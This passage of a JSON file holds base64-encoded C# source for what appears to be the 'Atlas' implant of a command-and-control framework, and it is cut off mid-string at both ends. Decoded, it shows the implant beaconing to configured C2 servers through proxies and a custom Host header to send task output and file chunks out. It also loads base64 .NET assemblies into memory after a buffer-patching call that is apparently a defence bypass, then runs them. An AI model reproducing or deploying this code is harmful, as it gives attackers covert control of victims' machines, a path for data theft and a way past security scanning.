CAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmICgoSm9iLnRvdGFsX2NodW5rcyAhPSAwKSAmJiAoIUpvYi51cGxvYWQpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtfbnVtICE9IEpvYi50b3RhbF9jaHVua3MpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5UYXNrUmVzcG9uc2UgVGFza1Jlc3BvbnNlID0gbmV3IFV0aWxzLlRhc2tSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyX291dHB1dCA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAiZmFsc2UiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5UYXNrUmVzcG9uc2UgVGFza1Jlc3BvbnNlID0gbmV3IFV0aWxzLlRhc2tSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyX291dHB1dCA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAidHJ1ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19kYXRhID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gSm9iLnJlc3BvbnNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAidHJ1ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHN0cmluZyBEYXRhID0gVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgIGlmIChEYXRhLkNvbnRhaW5zKCJbXSIpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5VVUlEICsgVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ3J5cHRvLkVuY3J5cHQoVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpKTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBQb3N0KFNlcmlhbGl6ZWREYXRhKTsNCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhyZXN1bHQpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgZmluYWxfcmVzdWx0ID0gQ3J5cHRvLkRlY3J5cHQocmVzdWx0KTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLlBvc3RSZXNwb25zZVJlc3BvbnNlIFBvc3RSZXNwb25zZVJlc3BvbnNlID0gVXRpbHMuUG9zdFJlc3BvbnNlUmVzcG9uc2UuRnJvbUpzb24oZmluYWxfcmVzdWx0LlN1YnN0cmluZygzNikpOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLlJlc3BvbnNlIFJlc3BvbnNlIGluIFBvc3RSZXNwb25zZVJlc3BvbnNlLnJlc3BvbnNlcykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLkpvYiBKb2IgaW4gSm9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNvbXBsZXRlZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnRhc2tfaWQgPT0gUmVzcG9uc2UudGFza19pZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChSZXNwb25zZS5zdGF0dXMgPT0gInN1Y2Nlc3MiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmRvd25sb2FkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuZmlsZV9pZCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmZpbGVfaWQgPSBSZXNwb25zZS5maWxlX2lkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnRvdGFsX2NodW5rcyA9PSBKb2IuY2h1bmtfbnVtKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuUmVtb3ZlSm9iKEpvYiwgSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtzLkNvdW50ICE9IDApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5SZW1vdmVBdCgwKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKChKb2IudG90YWxfY2h1bmtzICE9IDApICYgKCFKb2IudXBsb2FkKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rX251bSArIDEgIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuUmVtb3ZlQXQoMCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua19udW0rKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuUmVtb3ZlSm9iKEpvYiwgSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlJlbW92ZUpvYihKb2IsIEpvYkxpc3QpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KI2lmIChERUZBVUxUIHx8IERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXQoc3RyaW5nIEI2NERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBudWxsOw0KICAgICAgICAgICAgV2ViQ2xpZW50IGNsaWVudCA9IG5ldyBTeXN0ZW0uTmV0LldlYkNsaWVudCgpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5EZWZhdWx0UHJveHkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gV2ViUmVxdWVzdC5EZWZhdWx0V2ViUHJveHk7DQogICAgICAgICAgICAgICAgY2xpZW50LlVzZURlZmF1bHRDcmVkZW50aWFscyA9IHRydWU7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5LkNyZWRlbnRpYWxzID0gQ3JlZGVudGlhbENhY2hlLkRlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFdlYlByb3h5IHByb3h5ID0gbmV3IFdlYlByb3h5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBBZGRyZXNzID0gbmV3IFVyaShDb25maWcuUHJveHlBZGRyZXNzKSwNCiAgICAgICAgICAgICAgICAgICAgVXNlRGVmYXVsdENyZWRlbnRpYWxzID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgIENyZWRlbnRpYWxzID0gbmV3IE5ldHdvcmtDcmVkZW50aWFsKENvbmZpZy5Qcm94eVVzZXIsIENvbmZpZy5Qcm94eVBhc3N3b3JkKQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gcHJveHk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjbGllbnQuSGVhZGVycy5BZGQoIlVzZXItQWdlbnQiLCBDb25maWcuVXNlckFnZW50KTsNCiAgICAgICAgICAgIGlmIChDb25maWcuSG9zdEhlYWRlciAhPSAiIikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjbGllbnQuSGVhZGVycy5BZGQoIkhvc3QiLCBDb25maWcuSG9zdEhlYWRlcik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjbGllbnQuUXVlcnlTdHJpbmcuQWRkKENvbmZpZy5QYXJhbSwgQjY0RGF0YS5SZXBsYWNlKCIrIiwgIiUyQiIpLlJlcGxhY2UoIi8iLCAiJTJGIikuUmVwbGFjZSgiPSIsICIlM0QiKS5SZXBsYWNlKCJcbiIsICIlMEEiKSk7DQogICAgICAgICAgICBDb25maWcuU2VydmVycyA9IENvbmZpZy5TZXJ2ZXJzLk9yZGVyQnkocz0+cy5jb3VudCkuVG9MaXN0KCk7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXN1bHQgPSBjbGllbnQuRG93bmxvYWRTdHJpbmcoQ29uZmlnLlNlcnZlcnNbMF0uZG9tYWluICsgQ29uZmlnLlVybCk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uZmlnLlNlcnZlcnNbMF0uY291bnQrKzsgDQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFBvc3Qoc3RyaW5nIEI2NERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBudWxsOw0KICAgICAgICAgICAgV2ViQ2xpZW50IGNsaWVudCA9IG5ldyBTeXN0ZW0uTmV0LldlYkNsaWVudCgpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5EZWZhdWx0UHJveHkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gV2ViUmVxdWVzdC5EZWZhdWx0V2ViUHJveHk7DQogICAgICAgICAgICAgICAgY2xpZW50LlVzZURlZmF1bHRDcmVkZW50aWFscyA9IHRydWU7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5LkNyZWRlbnRpYWxzID0gQ3JlZGVudGlhbENhY2hlLkRlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgV2ViUHJveHkgcHJveHkgPSBuZXcgV2ViUHJveHkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEFkZHJlc3MgPSBuZXcgVXJpKENvbmZpZy5Qcm94eUFkZHJlc3MpLA0KICAgICAgICAgICAgICAgICAgICBVc2VEZWZhdWx0Q3JlZGVudGlhbHMgPSBmYWxzZSwNCiAgICAgICAgICAgICAgICAgICAgQ3JlZGVudGlhbHMgPSBuZXcgTmV0d29ya0NyZWRlbnRpYWwoQ29uZmlnLlByb3h5VXNlciwgQ29uZmlnLlByb3h5UGFzc3dvcmQpDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICBjbGllbnQuUHJveHkgPSBwcm94eTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNsaWVudC5IZWFkZXJzLkFkZCgiVXNlci1BZ2VudCIsIENvbmZpZy5Vc2VyQWdlbnQpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5Ib3N0SGVhZGVyICE9ICIiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNsaWVudC5IZWFkZXJzLkFkZCgiSG9zdCIsIENvbmZpZy5Ib3N0SGVhZGVyKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIENvbmZpZy5TZXJ2ZXJzID0gQ29uZmlnLlNlcnZlcnMuT3JkZXJCeShzID0+IHMuY291bnQpLlRvTGlzdCgpOw0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmVzdWx0ID0gY2xpZW50LlVwbG9hZFN0cmluZyhDb25maWcuU2VydmVyc1swXS5kb21haW4gKyBDb25maWcuVXJsLCBCNjREYXRhKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25maWcuU2VydmVyc1swXS5jb3VudCsrOw0KICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiNlbmRpZg0KICAgIH0NCn0NCg=="
        },
        {
          "Modules.cs": "77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlRleHQ7DQp1c2luZyBTeXN0ZW0uUmVmbGVjdGlvbjsNCnVzaW5nIFN5c3RlbS5JTzsNCnVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOw0KdXNpbmcgU3lzdGVtLkxpbnE7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIGNsYXNzIE1vZHVsZXMNCiAgICB7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBDaGVjayhzdHJpbmcgRmlsZUlkKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBib29sIGEgPSBDb25maWcuTW9kdWxlcy5Db250YWluc0tleShGaWxlSWQpOw0KICAgICAgICAgICAgICAgIHJldHVybiBhOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRGdWxsTmFtZShzdHJpbmcgRmlsZUlkKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoQ2hlY2soRmlsZUlkKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHN0cmluZyBGdWxsTmFtZSA9IENvbmZpZy5Nb2R1bGVzW0ZpbGVJZF07DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBGdWxsTmFtZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuICIiOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgTGlzdEFzc2VtYmxpZXMoKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgQXNzZW1ibHlMaXN0ID0gIiI7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChLZXlWYWx1ZVBhaXI8c3RyaW5nLCBzdHJpbmc+IEVudHJ5IGluIENvbmZpZy5Nb2R1bGVzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIE1vZHVsZSA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhFbnRyeS5WYWx1ZSkpOw0KICAgICAgICAgICAgICAgICAgICBzdHJpbmdbXSBBc3NlbWJseSA9IE1vZHVsZS5TcGxpdCgnLCcpOw0KICAgICAgICAgICAgICAgICAgICBBc3NlbWJseUxpc3QgKz0gQXNzZW1ibHlbMF0gKyAnXG4nOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gQXNzZW1ibHlMaXN0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gQXNzZW1ibHlMaXN0ID0gIiI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgTG9hZChzdHJpbmcgRmlsZUlkLHN0cmluZyBCNjRBc3NlbWJseSkNCiAgICAgICAgew0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKENoZWNrKEZpbGVJZCkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIFBhdGNoQnVmZmVyKCk7DQogICAgICAgICAgICAgICAgICAgIHZhciBhID0gQXNzZW1ibHkuTG9hZChDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQjY0QXNzZW1ibHkpKTsNCiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIGZ1bGxuYW1lID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKGEuRnVsbE5hbWUpKTsNCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLk1vZHVsZXMuQWRkKEZpbGVJZCwgZnVsbG5hbWUpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEludm9rZShzdHJpbmcgRmlsZUlkLCBzdHJpbmdbXSBhcmdzKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgb3V0cHV0ID0gIiI7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzdHJpbmcgRnVsbE5hbWUgPSBHZXRGdWxsTmFtZShGaWxlSWQpOw0KICAgICAgICAgICAgICAgIEFzc2VtYmx5W10gYXNzZW1zID0gQXBwRG9tYWluLkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKEFzc2VtYmx5IGFzc2VtIGluIGFzc2VtcykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChhc3NlbS5GdWxsTmFtZSA9PSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoRnVsbE5hbWUpKSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgTWV0aG9kSW5mbyBlbnRyeXBvaW50ID0gYXNzZW0uRW50cnlQb2ludDsNCiAgICAgICAgICAgICAgICAgICAgICAgIG9iamVjdFtdIGFyZyA9IG5ldyBvYmplY3RbXSB7IGFyZ3MgfTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyaXRlciByZWFsU3RkT3V0ID0gQ29uc29sZS5PdXQ7DQogICAgICAgICAgICAgICAgICAgICAgICBUZXh0V3JpdGVyIHJlYWxTdGRFcnIgPSBDb25zb2xlLkVycm9yOw0KICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyaXRlciBzdGRPdXRXcml0ZXIgPSBuZXcgU3RyaW5nV3JpdGVyKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBUZXh0V3JpdGVyIHN0ZEVycldyaXRlciA9IG5ldyBTdHJpbmdXcml0ZXIoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuU2V0T3V0KHN0ZE91dFdyaXRlcik7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLlNldEVycm9yKHN0ZEVycldyaXRlcik7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5cG9pbnQuSW52b2tlKG51bGwsIGFyZyk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuT3V0LkZsdXNoKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLkVycm9yLkZsdXNoKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLlNldE91dChyZWFsU3RkT3V0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuU2V0RXJyb3IocmVhbFN0ZEVycik7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IHN0ZE91dFdyaXRlci5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ICs9IHN0ZEVycldyaXRlci5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJ